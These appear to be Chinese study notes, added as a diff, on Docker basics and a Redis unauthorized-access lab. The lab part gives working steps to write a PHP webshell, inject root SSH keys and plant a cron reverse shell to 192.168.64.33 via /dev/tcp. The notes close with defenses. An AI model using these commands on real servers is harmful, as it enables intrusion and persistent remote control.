@@ -1,0 +1,173 @@
+redis为非关系型数据库。
+key-value型。
+默认端口：6379
+
+
+docker也能实现虚拟化。容器使用沙箱机制，相互直接没有任何接口。
+
+安装docker：
+sudo apt install docker.io
+service start docker		启动服务
+
+安装docker-compose：docker环境管理工具：
+pip install docker-compose
+docker-compose -v		查看版本
+
+docker网络模式：
+使用docker run创建docker容器时，可使用--net选项指定容器的网络模式：
+四种网络模式：
+1.host模式：--net=host
+2.container模式：--net=container:NAME_or_ID
+3.none模式：--net=none
+4.bridge模式：--net=bridge     //默认设置
+
+
+Network Namespace技术：即一个独立的网络环境
+
+
+host模式：
+该模式下的容器与宿主机共用一个Network Namespace(共用宿主机的ip和端口).
+eg1：以host方式开启一个运行web服务的容器：
+则外界直接访问宿主机的80端口即可，不需NAT转换。
+ifconfig等命令查看的也是宿主机的网卡信息，但文件系统等还是隔离的.
+
+container模式：
+该模式指定新创建的容器和一个已存在的容器共享一个Network Namespace，故新创建的容器和指定的容器共享ip和端口.
+
+none模式：
+该模式下的容器有自己独立的Network Namespace，却不为其做任何网络配置，需自己为其添加网卡、配置ip等.
+
+bridge模式：docker默认的网络设置.
+此模式会为容器分配一个独立的Network Namespace并设置ip，
+
+docker服务启动后，会在宿主机上创建一个名为docker0的虚拟网桥，宿主机上启动的docker容器都会连接到该虚拟网桥上. docker会从私有ip网段中选择一个和宿主机不同的子网和ip(一般是xx.xx.xx.1且作为默认网关)给到docker0，连接到docker0的容器则从该子网中选择一个未分配的ip. 
+docker0和宿主机通信一般是通过端口转发.
+
+
+
+常用docker命令：
+dockers			//查看docker所有命令
+docker command --help
+docker pull 镜像名		//获取镜像
+docker run -it 镜像名 /bin/bash	//启动容器，且以命令行模式进入该容器。 -i 交互式，/bin/bash 交互式shell
+exit			//退出终端
+docker ps -a		//查看所有容器信息
+docker start <容器ID>	//启动容器
+docker run -itd --name ubuntu-test ubuntu /bin/bash	//-d为后台运行容器
+docker images		//查看所有镜像
+
+docker stop/start/restart <容器ID>
+docker attach <容器ID>	//进入容器。不常用
+docker exec 或
+docker exec -it 18201ac6aabb /bin/bash	进入容器，常用docker exec命令，退出容器不会导致容器停止。
+
+docker rm -f <容器ID>	//删除容器
+docker run -p 6379:6379 -d redis	//运行容器， -p指定映射端口  格式：主机(宿主)端口:容器端口
+
+
+redis未授权访问环境配置：
+进入redis目录，编译镜像：docker build -t rediszidingy .		//.表示当前目录  自定义容器名。
+docker images	//查看到镜像
+
+-->
+启动镜像：
+docker run -d -p 6376:6379 -p 20:22 reddiszzz6
+
+apt install redis-tools	//相当于redis客户端
+
+
+第三步：连接redis，检测是否登录成功：
+redis-cli -h 192.168.43.6 -p 6379	//其中-p指定参数；-a指定密码
+然后执行info
+
+
+第四步：进入容器，配置ssh公私钥。命令：
+docker exec -it 18201ac6aabb /bin/bash
+再执行ssh-keygen -t rsa配置公私钥
+启动ssh服务：service ssh restart
+
+
+利用前提：
+redis未设置验证密码：注释掉redis.conf中的requirepass属性即可。
+redis可正常访问。
+
+
+(1)利用redis写入shell(适用win、linux)：
+前提：已知web目录绝对路径；有web目录读写权限。
+操作：
+配置持久化文件的存储目录，具体命令：
+config set dir /var/www/html
+config set dbfilename redis.php
+set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n"    //其中\r\n表示换行，避免redis其他数据干扰
+save
+则写入/var/www/html/redis.php文件成功。
+注：自动化工具：RedisGetshell.py
+
+
+(2)利用redis写入ssh公钥(仅适用linux)：
+利用前提：
+存在/root/.ssh目录；开启了ssh密钥登录；root权限运行的redis.
+操作：
+1.先连接redis服务器。
+2.生成公私钥(私钥id_rsa 公钥id_rsa.pub)，命令：
+ssh-keygen -t rsa	//一般本地生成即可，再将公钥写入。
+3.处理公钥文件，加上换行符，避免解析失败。命令：
+(echo -e "\n\n";cat /root/.ssh/id_rsa.pub;echo -e "\n\n") > /root/.ssh/keyz6.txt
+
+
+4.将公钥文件写入redis服务端的缓冲。命令：
+cat /root/.ssh/keyz6.txt | redis-cli -h 192.168.88.128 -p 6379 -x set xxx
+其中-x表示标准输入，xxx为自定义文件名。
+
+4.配置持久化文件的存储目录与持久化文件的文件名，命令：
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+
+5.保存配置：save	//相当于将缓冲区的内容写入authorized_keys文件。
+
+6.使用私钥文件通过ssh登录redis服务器：
+ssh root@192.168.45.68 -i id_rsa	//避免报错：-o StrickHostKeyChecking=no   可加上此参数。  -p 22 为指定连接端口。
+如：
+ssh -p 22 root@192.168.88.128 -i /root/.ssh/id_rsa    
+然后输入自己生成公私钥的密码即可登录成功。
+
+
+
+redis持久化文件存储路径，可在redis.conf中修改，两个主要配置参数：
+1. dir：持久化文件的存储目录
+2. dbfilename：持久化文件的文件名。
+
+或使用工具。
+
+常见报错：
+-ERR Changing directory:No such file or directory-->因为目标机器未生成公私钥使得/root/.ssh目录不存在。
+Permisson denied-->权限不足，不是以root运行的redis
+unknow command 'config'-->redis服务端禁止config命令进行配置操作
+
+(3)利用redis写入计划任务反弹shell(适用范围：centos)：
+前提：centos系统；权限可写计划任务。
+操作：
+1. 监听端口：nc -lvvp 2222
+2. 配置持久化文件的存储目录：
+config set dir /var/spool/cron/
+3. 写入：
+set y "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.64.33/2222 0>&1\n\n"	即每1分钟反弹一次shell
+4. 配置持久化文件的文件名：
+config set dbfilename root
+5.保存：
+save
+
+
+(4)利用redis主从同步rce (redis<=5.0.5)：redis-rogue-server项目
+
+注意：
+以下操作尽量别用：
+flushdb	//清空当前数据库的所有key
+Flushall	//清空整个redis服务器的数据(删除所有数据库的所有key)
+key *	//获取redis中的所有key
+
+
+
+
+防御：
+禁止使用root启动redis服务；开启redis密码验证；修改默认监听端口；添加ip白名单访问。
